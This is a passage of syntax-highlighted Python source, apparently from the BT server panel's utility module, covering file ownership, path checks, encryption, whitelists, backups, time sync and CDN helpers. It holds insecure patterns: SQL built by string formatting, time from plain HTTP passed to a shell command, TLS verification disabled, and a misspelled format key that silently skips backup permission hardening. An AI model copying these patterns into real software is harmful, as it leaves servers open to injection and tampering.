class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置用户组</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_own</span>(<span class="params">filename,user,group=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_info = getpwnam(user)</span><br><span class="line">        user = user_info.pw_uid</span><br><span class="line">        <span class="keyword">if</span> group:</span><br><span class="line">            user_info = getpwnam(group)</span><br><span class="line">        group = user_info.pw_gid</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment">#如果指定用户或组不存在，则使用www</span></span><br><span class="line">        user_info = getpwnam(<span class="string">&#x27;www&#x27;</span>)</span><br><span class="line">        user = user_info.pw_uid</span><br><span class="line">        group = user_info.pw_gid</span><br><span class="line">    os.chown(filename,user,group)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#校验路径安全</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">path_safe_check</span>(<span class="params">path,force=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">256</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    checks = [<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;~&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;`&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> checks:</span><br><span class="line">        <span class="keyword">if</span> path.find(c) != -<span class="number">1</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> force:</span><br><span class="line">        rep = <span class="string">r&quot;^[\w\s\.\/-]+$&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(rep,path): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#取数据库字符集</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_database_character</span>(<span class="params">db_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> panelMysql</span><br><span class="line">        tmp = panelMysql.panelMysql().query(<span class="string">&quot;show create database `%s`&quot;</span> % db_name.strip())</span><br><span class="line">        c_type = <span class="built_in">str</span>(re.findall(<span class="string">r&quot;SET\s+([\w\d-]+)\s&quot;</span>,tmp[<span class="number">0</span>][<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        c_types = [<span class="string">&#x27;utf8&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;big5&#x27;</span>,<span class="string">&#x27;utf8mb4&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> c_type.lower() <span class="keyword">in</span> c_types: <span class="keyword">return</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> c_type</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en_punycode</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">        domain = domain.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    tmp = domain.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    newdomain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dkey <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">if</span> dkey == <span class="string">&#x27;*&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="comment">#匹配非ascii字符</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">u&quot;[\x80-\xff]+&quot;</span>,dkey)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>: <span class="keyword">match</span> = re.search(<span class="string">u&quot;[\u4e00-\u9fa5]+&quot;</span>,dkey)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">            newdomain += dkey + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">                newdomain += <span class="string">&#x27;xn--&#x27;</span> + dkey.decode(<span class="string">&#x27;utf-8&#x27;</span>).encode(<span class="string">&#x27;punycode&#x27;</span>) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                newdomain += <span class="string">&#x27;xn--&#x27;</span> + dkey.encode(<span class="string">&#x27;punycode&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span>: newdomain = <span class="string">&quot;*.&quot;</span> + newdomain</span><br><span class="line">    <span class="keyword">return</span> newdomain[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#punycode 转中文</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_punycode</span>(<span class="params">domain</span>):</span><br><span class="line">    tmp = domain.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    newdomain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> dkey <span class="keyword">in</span> tmp:</span><br><span class="line">        <span class="keyword">if</span> dkey.find(<span class="string">&#x27;xn--&#x27;</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">            newdomain += dkey.replace(<span class="string">&#x27;xn--&#x27;</span>,<span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;punycode&#x27;</span>) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            newdomain += dkey + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> newdomain[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#取计划任务文件路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cron_path</span>():</span><br><span class="line">    u_file = <span class="string">&#x27;/var/spool/cron/crontabs/root&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(u_file):</span><br><span class="line">        file=<span class="string">&#x27;/var/spool/cron/root&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        file=u_file</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en_crypt</span>(<span class="params">key,strings</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(strings) != <span class="built_in">bytes</span>: strings = strings.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        result = f.encrypt(strings)</span><br><span class="line">        <span class="keyword">return</span> result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment">#print(get_error_info())</span></span><br><span class="line">        <span class="keyword">return</span> strings</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_crypt</span>(<span class="params">key,strings</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(strings) != <span class="built_in">bytes</span>: strings = strings.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line">        f = Fernet(key)</span><br><span class="line">        result =  f.decrypt(strings).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment">#print(get_error_info())</span></span><br><span class="line">        <span class="keyword">return</span> strings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查IP白名单</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip_panel</span>():</span><br><span class="line">    ip_file = <span class="string">&#x27;data/limitip.conf&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(ip_file):</span><br><span class="line">        iplist = ReadFile(ip_file)</span><br><span class="line">        <span class="keyword">if</span> iplist:</span><br><span class="line">            iplist = iplist.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> GetClientIp() <span class="keyword">in</span> iplist.split(<span class="string">&#x27;,&#x27;</span>):</span><br><span class="line">                errorStr = ReadFile(<span class="string">&#x27;./BTPanel/templates/&#x27;</span> + GetConfigValue(<span class="string">&#x27;template&#x27;</span>) + <span class="string">&#x27;/error2.html&#x27;</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    errorStr = errorStr.<span class="built_in">format</span>(getMsg(<span class="string">&#x27;PAGE_ERR_TITLE&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_IP_H1&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_IP_P1&#x27;</span>,(GetClientIp(),)),getMsg(<span class="string">&#x27;PAGE_ERR_IP_P2&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_IP_P3&#x27;</span>),getMsg(<span class="string">&#x27;NAME&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_HELP&#x27;</span>))</span><br><span class="line">                <span class="keyword">except</span> IndexError:<span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">return</span> errorStr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查面板域名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_domain_panel</span>():</span><br><span class="line">    tmp = GetHost()</span><br><span class="line">    domain = ReadFile(<span class="string">&#x27;data/domain.conf&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> domain:</span><br><span class="line">        <span class="keyword">if</span> tmp.strip().lower() != domain.strip().lower():</span><br><span class="line">            errorStr = ReadFile(<span class="string">&#x27;./BTPanel/templates/&#x27;</span> + GetConfigValue(<span class="string">&#x27;template&#x27;</span>) + <span class="string">&#x27;/error2.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                errorStr = errorStr.<span class="built_in">format</span>(getMsg(<span class="string">&#x27;PAGE_ERR_TITLE&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_DOMAIN_H1&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_DOMAIN_P1&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_DOMAIN_P2&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_DOMAIN_P3&#x27;</span>),getMsg(<span class="string">&#x27;NAME&#x27;</span>),getMsg(<span class="string">&#x27;PAGE_ERR_HELP&#x27;</span>))</span><br><span class="line">            <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> errorStr</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#是否离线模式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_local</span>():</span><br><span class="line">    s_file = <span class="string">&#x27;/www/server/panel/data/not_network.pl&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> os.path.exists(s_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#自动备份面板数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auto_backup_panel</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        panel_paeh = <span class="string">&#x27;/www/server/panel&#x27;</span></span><br><span class="line">        paths = panel_paeh + <span class="string">&#x27;/data/not_auto_backup.pl&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(paths): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        b_path = <span class="string">&#x27;/www/backup/panel&#x27;</span></span><br><span class="line">        backup_path = b_path + <span class="string">&#x27;/&#x27;</span> + format_date(<span class="string">&#x27;%Y-%m-%d&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(backup_path): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> os.path.getsize(panel_paeh + <span class="string">&#x27;/data/default.db&#x27;</span>) &gt; <span class="number">104857600</span> * <span class="number">2</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        os.makedirs(backup_path,<span class="number">384</span>)</span><br><span class="line">        <span class="keyword">import</span> shutil</span><br><span class="line">        shutil.copytree(panel_paeh + <span class="string">&#x27;/data&#x27;</span>,backup_path + <span class="string">&#x27;/data&#x27;</span>)</span><br><span class="line">        shutil.copytree(panel_paeh + <span class="string">&#x27;/config&#x27;</span>,backup_path + <span class="string">&#x27;/config&#x27;</span>)</span><br><span class="line">        shutil.copytree(panel_paeh + <span class="string">&#x27;/vhost&#x27;</span>,backup_path + <span class="string">&#x27;/vhost&#x27;</span>)</span><br><span class="line">        ExecShell(<span class="string">&quot;chmod -R 600 &#123;path&#125;;chown -R root.root &#123;path&#125;&quot;</span>.<span class="built_in">format</span>(paht=b_path))</span><br><span class="line">        time_now = time.time() - (<span class="number">86400</span> * <span class="number">15</span>)</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(b_path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> time.mktime(time.strptime(f, <span class="string">&quot;%Y-%m-%d&quot;</span>)) &lt; time_now:</span><br><span class="line">                    path = b_path + <span class="string">&#x27;/&#x27;</span> + f</span><br><span class="line">                    <span class="keyword">if</span> os.path.exists(path): shutil.rmtree(path)</span><br><span class="line">            <span class="keyword">except</span>: <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#检查端口状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port_stat</span>(<span class="params">port,localIP = <span class="string">&#x27;127.0.0.1&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    temp = &#123;&#125;</span><br><span class="line">    temp[<span class="string">&#x27;port&#x27;</span>] = port</span><br><span class="line">    temp[<span class="string">&#x27;local&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        s.settimeout(<span class="number">0.15</span>)</span><br><span class="line">        s.connect((localIP,port))</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        temp[<span class="string">&#x27;local&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> temp[<span class="string">&#x27;local&#x27;</span>]: result +=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#同步时间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sync_date</span>():</span><br><span class="line">    tip_file = <span class="string">&quot;/dev/shm/last_sync_time.pl&quot;</span></span><br><span class="line">    s_time = <span class="built_in">int</span>(time.time())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(tip_file):</span><br><span class="line">            <span class="keyword">if</span> s_time - <span class="built_in">int</span>(readFile(tip_file)) &lt; <span class="number">60</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            os.remove(tip_file)</span><br><span class="line">        time_str = HttpGet(<span class="string">&#x27;http://www.bt.cn/api/index/get_time&#x27;</span>)</span><br><span class="line">        new_time = <span class="built_in">int</span>(time_str)</span><br><span class="line">        time_arr = time.localtime(new_time)</span><br><span class="line">        date_str = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time_arr)</span><br><span class="line">        ExecShell(<span class="string">&#x27;date -s &quot;%s&quot;&#x27;</span> % date_str)</span><br><span class="line">        writeFile(tip_file,<span class="built_in">str</span>(s_time))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(tip_file): os.remove(tip_file)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#重载模块</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reload_mod</span>(<span class="params">mod_name = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment">#是否重载指定模块</span></span><br><span class="line">    modules = []</span><br><span class="line">    <span class="keyword">if</span> mod_name:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(mod_name) == <span class="built_in">str</span>:</span><br><span class="line">            mod_names = mod_name.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> mod_name <span class="keyword">in</span> mod_names:</span><br><span class="line">            <span class="keyword">if</span> mod_name <span class="keyword">in</span> sys.modules:</span><br><span class="line">                <span class="built_in">print</span>(mod_name)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">                        reload(sys.modules[mod_name])</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        importlib.reload(sys.modules[mod_name])</span><br><span class="line">                    modules.append([mod_name,<span class="literal">True</span>])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    modules.append([mod_name,<span class="literal">False</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                modules.append([mod_name,<span class="literal">False</span>])</span><br><span class="line">        <span class="keyword">return</span> modules</span><br><span class="line"></span><br><span class="line">    <span class="comment">#重载所有模块</span></span><br><span class="line">    <span class="keyword">for</span> mod_name <span class="keyword">in</span> sys.modules.keys():</span><br><span class="line">        <span class="keyword">if</span> mod_name <span class="keyword">in</span> [<span class="string">&#x27;BTPanel&#x27;</span>]: <span class="keyword">continue</span></span><br><span class="line">        f = <span class="built_in">getattr</span>(sys.modules[mod_name],<span class="string">&#x27;__file__&#x27;</span>,<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.find(<span class="string">&#x27;panel/&#x27;</span>) == -<span class="number">1</span>: <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">                    reload(sys.modules[mod_name])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    importlib.reload(sys.modules[mod_name])</span><br><span class="line">                modules.append([mod_name,<span class="literal">True</span>])</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                modules.append([mod_name,<span class="literal">False</span>])</span><br><span class="line">    <span class="keyword">return</span> modules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_hexb</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>: data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pdata = base64.b64encode(data)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(pdata) == <span class="built_in">str</span>: pdata = pdata.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(pdata)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en_hexb</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>: data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    result = base64.b64decode(binascii.unhexlify(data))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(result) != <span class="built_in">str</span>: result = result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file_url</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">            data = ExecShell(<span class="string">&#x27;/usr/bin/curl https://scanner.baidu.com/enqueue -F archive=@%s&#x27;</span> % filename)</span><br><span class="line">            data = json.loads(data[<span class="number">0</span>])</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">import</span> requests</span><br><span class="line">            default_headers = &#123;</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            data_list = requests.get(url=data[<span class="string">&#x27;url&#x27;</span>], headers=default_headers, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">return</span> (data_list.json())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#直接请求到PHP-FPM</span></span><br><span class="line"><span class="comment">#version php版本</span></span><br><span class="line"><span class="comment">#uri 请求uri</span></span><br><span class="line"><span class="comment">#filename 要执行的php文件</span></span><br><span class="line"><span class="comment">#args 请求参数</span></span><br><span class="line"><span class="comment">#method 请求方式</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_php</span>(<span class="params">version,uri,document_root,method=<span class="string">&#x27;GET&#x27;</span>,pdata=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">import</span> panelPHP</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(pdata) == <span class="built_in">dict</span>: pdata = url_encode(pdata)</span><br><span class="line">    p = panelPHP.FPM(<span class="string">&#x27;/tmp/php-cgi-&#x27;</span>+version+<span class="string">&#x27;.sock&#x27;</span>,document_root)</span><br><span class="line">    result = p.load_url_public(uri,pdata,method)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>: <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">        pdata = urllib.parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pdata = urllib.urlencode(data)</span><br><span class="line">    <span class="keyword">return</span> pdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">url_decode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>: <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] != <span class="number">2</span>:</span><br><span class="line">        pdata = urllib.parse.urldecode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pdata = urllib.urldecode(data)</span><br><span class="line">    <span class="keyword">return</span> pdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            result = unicode(data,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = data.encode(<span class="string">&#x27;utf8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_decode</span>(<span class="params">data,charset = <span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">2</span>:</span><br><span class="line">            result = unicode(data,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = data.decode(<span class="string">&#x27;utf8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">import_cdn_plugin</span>():</span><br><span class="line">    plugin_path = <span class="string">&#x27;plugin/static_cdn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(plugin_path): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> static_cdn_main</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        package_path_append(plugin_path)</span><br><span class="line">        <span class="keyword">import</span> static_cdn_main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cdn_hosts</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> import_cdn_plugin(): <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">import</span> static_cdn_main</span><br><span class="line">        <span class="keyword">return</span> static_cdn_main.static_cdn_main().get_hosts(<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cdn_url</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&#x27;plugin/static_cdn/not_open.pl&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">from</span> BTPanel <span class="keyword">import</span> cache</span><br><span class="line">        cdn_url = cache.get(<span class="string">&#x27;cdn_url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> cdn_url: <span class="keyword">return</span> cdn_url</span><br><span class="line">        <span class="keyword">if</span> import_cdn_plugin(): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">import</span> static_cdn_main</span><br><span class="line">        cdn_url = static_cdn_main.static_cdn_main().get_url(<span class="literal">None</span>)</span><br><span class="line">        cache.<span class="built_in">set</span>(<span class="string">&#x27;cdn_url&#x27;</span>,cdn_url,<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">return</span> cdn_url</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cdn_url</span>(<span class="params">cdn_url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cdn_url: <span 